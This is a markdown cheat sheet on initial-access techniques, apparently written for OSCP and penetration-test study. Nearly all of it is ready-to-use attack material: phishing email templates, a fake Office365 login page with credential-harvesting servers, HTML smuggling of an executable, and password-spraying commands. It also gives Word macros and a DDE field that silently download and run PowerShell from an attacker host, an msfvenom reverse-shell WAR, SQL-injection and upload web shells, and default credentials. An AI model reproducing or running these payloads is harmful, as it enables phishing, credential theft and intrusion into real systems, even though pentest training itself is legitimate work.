# Initial Access Techniques

Comprehensive guide for gaining initial foothold in target environments - essential for penetration testing.

---

## Table of Contents
1. [Phishing & Social Engineering](#1-phishing--social-engineering)
2. [Password Attacks](#2-password-attacks)
3. [Forced Authentication](#3-forced-authentication)
4. [Office Macro Payloads](#4-office-macro-payloads)
5. [Web Application Exploits](#5-web-application-exploits)
6. [Exposed Services](#6-exposed-services)
7. [OSCP Quick Wins](#7-oscp-quick-wins)

---

## 1. Phishing & Social Engineering

### 1.1 Spear Phishing Emails

**Effective Subject Lines:**
```
- IT Security Alert: Password Expiration
- Urgent: Review Required Financial Document
- [CEO Name] wants you to review this
- Action Required: Update Your Benefits
```

**Email Template:**
```html
<html>
<body>
Dear [Name],<br><br>

Your password will expire in 24 hours. Please update it immediately to avoid account lockout.<br><br>

<a href="http://phishing-domain.com/portal">Update Password Now</a><br><br>

Regards,<br>
IT Department
</body>
</html>
```

---

### 1.2 Credential Harvesting

**Landing Page (Fake Office365):**
```html
<!DOCTYPE html>
<html>
<head>
    <title>Sign in to your account</title>
    <link rel="stylesheet" href="office365.css">
</head>
<body>
    <div class="login-box">
        <img src="microsoft-logo.png">
        <h2>Sign in</h2>
        <form action="/harvest" method="POST">
            <input type="email" name="email" placeholder="Email address" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign in</button>
        </form>
    </div>
</body>
</html>
```

**Backend (Python Flask):**
```python
from flask import Flask, request, redirect
app = Flask(__name__)

@app.route('/harvest', methods=['POST'])
def harvest():
    email = request.form['email']
    password = request.form['password']

    # Log credentials
    with open('creds.txt', 'a') as f:
        f.write(f'{email}:{password}\n')

    # Redirect to real site
    return redirect('https://office.com')

app.run(host='0.0.0.0', port=80)
```

---

### 1.3 HTML Smuggling

**Bypass Email Filters:**
```html
<html>
<body>
<script>
    // Base64 encoded payload
    var payload = "TVqQAAMAAAAEAAAA//8AALgAAAAA..."; // Payload here

    // Decode and create blob
    var binary = atob(payload);
    var bytes = new Uint8Array(binary.length);
    for (var i = 0; i < binary.length; i++) {
        bytes[i] = binary.charCodeAt(i);
    }
    var blob = new Blob([bytes], {type: 'application/octet-stream'});

    // Automatic download
    var url = URL.createObjectURL(blob);
    var a = document.createElement('a');
    a.href = url;
    a.download = 'QuarterlyReport.exe';
    document.body.appendChild(a);
    a.click();
</script>
<p>Please wait while your document loads...</p>
</body>
</html>
```

**Advantages:**
- No file attachment (bypasses email filters)
- Payload assembled on client-side

---

## 2. Password Attacks

### 2.1 OWA Password Spraying

**Outlook Web Access (OWA) Login:**
```bash
# Enumerate valid users first
./o365spray --validate -U users.txt

# Password spray (avoid lockout!)
./o365spray --spray -U valid_users.txt -P 'Winter2024!' --count 1 --lockout 5
```

**Manual with curl:**
```bash
# Test single credential
curl -k -X POST https://mail.target.com/owa/auth.owa \
  -d "destination=https://mail.target.com/owa&username=user@target.com&password=Password123!" \
  -H "Content-Type: application/x-www-form-urlencoded"

# Success: HTTP 302 redirect
# Failure: HTTP 200 with error message
```

**OSCP Tip:**
- Use common passwords: `Winter2024!`, `Summer2024!`, `Company2024!`
- Spray once per day to avoid lockouts

---

### 2.2 SMB Password Spraying

**CrackMapExec:**
```bash
# Spray against multiple hosts
crackmapexec smb targets.txt -u users.txt -p 'Winter2024!' --continue-on-success

# Single password, multiple users
crackmapexec smb 192.168.1.0/24 -u Administrator -p passwords.txt
```

**Metasploit:**
```bash
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.0/24
set SMBUser Administrator
set SMBPass Password123!
set STOP_ON_SUCCESS true
run
```

---

### 2.3 Kerberos Pre-Auth Bruteforce

**Kerbrute:**
```bash
# User enumeration
kerbrute userenum -d domain.local --dc dc.domain.local users.txt

# Password spray
kerbrute passwordspray -d domain.local --dc dc.domain.local users.txt 'Winter2024!'

# Brute force (not recommended)
kerbrute bruteuser -d domain.local --dc dc.domain.local passwords.txt administrator
```

**Advantages:**
- No account lockout risk (pre-auth doesn't increment bad password count)
- Fast and quiet

---

## 3. Forced Authentication

### 3.1 SMB Hash Capture

**Responder:**
```bash
# Start Responder (capture NTLM hashes)
sudo responder -I eth0 -wrf

# Trigger via:
# - UNC path in email: \\10.10.10.100\share
# - LNK file pointing to \\10.10.10.100\
# - Web link: file://10.10.10.100/test.txt
```

**LNK File (Windows):**
```powershell
# Create malicious LNK
$shortcut = (New-Object -ComObject WScript.Shell).CreateShortcut("C:\Users\Public\Documents\Report.lnk")
$shortcut.TargetPath = "\\10.10.10.100\share\file.txt"
$shortcut.IconLocation = "C:\Windows\System32\shell32.dll,3"
$shortcut.Save()
```

---

### 3.2 NTLM Relay

**Setup:**
```bash
# Start ntlmrelayx (relay to target)
impacket-ntlmrelayx -tf targets.txt -smb2support -socks

# Trigger authentication (e.g., via Responder, email, etc.)
# → Relayed to targets → SOCKS proxy for access
```

**SMB Signing Check:**
```bash
# Check if SMB signing is required (prevents relay)
crackmapexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt

# Only relay to targets WITHOUT signing required
```

---

### 3.3 LLMNR/NBT-NS Poisoning

**Responder (default):**
```bash
sudo responder -I eth0 -wrf

# Captures:
# - SMB (NTLMv2)
# - HTTP (Basic Auth, NTLM)
# - FTP, LDAP, etc.
```

**Mitigation Detection:**
```bash
# Check if LLMNR/NBT-NS is disabled
nmap --script broadcast-listener -e eth0
```

---

## 4. Office Macro Payloads

### 4.1 Basic Macro (cmd.exe)

**Word Macro (VBA):**
```vb
Sub AutoOpen()
    ExecutePayload
End Sub

Sub Document_Open()
    ExecutePayload
End Sub

Sub ExecutePayload()
    Dim cmd As String
    cmd = "cmd.exe /c powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.100/shell.ps1')"
    Shell cmd, vbHide
End Sub
```

**Save as:** `.docm` (Macro-Enabled Document)

---

### 4.2 Obfuscated Macro

**Environment Variable Obfuscation:**
```vb
Sub AutoOpen()
    Dim cmd As String
    cmd = Environ("COMSPEC") & " /c " & Environ("SYSTEMROOT") & "\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.100/shell.ps1')"
    Shell cmd, vbHide
End Sub
```

**String Concatenation:**
```vb
Sub AutoOpen()
    Dim p1, p2, p3 As String
    p1 = "power"
    p2 = "shell -w hidden -c "
    p3 = "IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.100/s.ps1')"
    Shell "cmd /c " & p1 & p2 & p3, vbHide
End Sub
```

---

### 4.3 DDE Exploit (Legacy)

**Dynamic Data Exchange:**
```
{DDEAUTO c:\\windows\\system32\\cmd.exe "/k powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.100/s.ps1')"}
```

**Insert:**
1. Insert → Field
2. Select `= (Formula)`
3. Toggle Field Codes (Alt+F9)
4. Paste DDE payload

**Note:** Patched in modern Office, but works on legacy versions

---

### 4.4 OLE Exploit

**Embedded Object:**
```
1. Insert → Object → Package
2. Select executable (payload.exe)
3. Change icon to PDF/document
4. User double-clicks → payload executes
```

---

## 5. Web Application Exploits

### 5.1 Common Vulnerabilities

**SQL Injection → RCE:**
```sql
-- MSSQL: xp_cmdshell
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami'; --

-- MySQL: INTO OUTFILE
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php' --
```

**File Upload → RCE:**
```bash
# Upload PHP shell
<?php system($_GET['cmd']); ?>

# Access
http://target.com/uploads/shell.php?cmd=whoami
```

**Remote File Inclusion (RFI):**
```
http://target.com/page.php?file=http://10.10.10.100/shell.txt

# shell.txt contains:
<?php system($_GET['cmd']); ?>
```

---

### 5.2 Exposed Admin Panels

**Default Credentials:**
```
- Tomcat: admin:admin, tomcat:tomcat
- Jenkins: admin:password
- phpMyAdmin: root:root, admin:admin
- GitLab: root:5iveL!fe
```

**Tomcat WAR Deployment:**
```bash
# Generate WAR payload
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.100 LPORT=443 -f war -o shell.war

# Upload via Tomcat Manager
# http://target:8080/manager/html

# Trigger
http://target:8080/shell/
```

---

## 6. Exposed Services

### 6.1 RDP Brute Force

**Crowbar:**
```bash
crowbar -b rdp -s 192.168.1.100/32 -u Administrator -C passwords.txt
```

**Hydra:**
```bash
hydra -l administrator -P passwords.txt rdp://192.168.1.100
```

**OSCP Tip:** Avoid brute force (noisy). Try default/common credentials only.

---

### 6.2 SSH Key-Based Access

**Found SSH Keys:**
```bash
# Common locations
~/.ssh/id_rsa
~/.ssh/id_dsa
/home/*/.ssh/id_rsa
/root/.ssh/id_rsa

# Crack passphrase
ssh2john id_rsa > hash.txt
john --wordlist=rockyou.txt hash.txt
```

**Use Key:**
```bash
chmod 600 id_rsa
ssh -i id_rsa user@192.168.1.100
```

---

### 6.3 Anonymous FTP

**Check:**
```bash
ftp 192.168.1.100
# Username: anonymous
# Password: anonymous

# Upload shell
put shell.php /var/www/html/shell.php
```

---

## 7. OSCP Quick Wins

### 7.1 Initial Access Checklist

**1. Service Enumeration:**
```bash
# Nmap full scan
sudo nmap -sC -sV -p- 192.168.1.100 -oN full_scan.txt

# Look for:
# - SMB (445) → null session, shares
# - HTTP (80/443/8080) → web apps, default creds
# - RDP (3389) → password spray
# - FTP (21) → anonymous, weak creds
```

**2. Low-Hanging Fruit:**
```bash
# Anonymous SMB
smbclient -L //192.168.1.100 -N

# Default credentials
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.1.100
```

**3. Web Vulnerabilities:**
```bash
# Directory brute force
feroxbuster -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt

# SQLi testing
sqlmap -u "http://192.168.1.100/page.php?id=1" --batch --dbs
```

---

### 7.2 Quick Phishing (OSCP Lab)

**Simple Credential Harvester:**
```python
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        params = parse_qs(post_data)

        print(f"[+] Captured: {params}")
        with open('creds.txt', 'a') as f:
            f.write(str(params) + '\n')

        self.send_response(302)
        self.send_header('Location', 'https://office.com')
        self.end_headers()

HTTPServer(('0.0.0.0', 80), Handler).serve_forever()
```

---

## 8. Tools Summary

| Tool | Purpose | OSCP Relevant |
|------|---------|---------------|
| **Responder** | LLMNR poisoning | ✅ Yes |
| **Kerbrute** | Kerberos enumeration/spray | ✅ Yes |
| **CrackMapExec** | SMB password spray | ✅ Yes |
| **Gophish** | Phishing campaigns | ⚠️ Social engineering |
| **o365spray** | OWA password spray | ⚠️ External only |
| **ntlmrelayx** | NTLM relay | ✅ Yes |

---

## 9. References
- Red Team Notes: https://www.ired.team/offensive-security/initial-access
- MITRE ATT&CK: Initial Access Techniques
- HackTricks: https://book.hacktricks.xyz/

---

**OSCP Note:** Focus on service exploitation (HTTP, SMB, FTP, RDP) and basic phishing. Password spraying and NTLM capture are highly effective in AD labs.
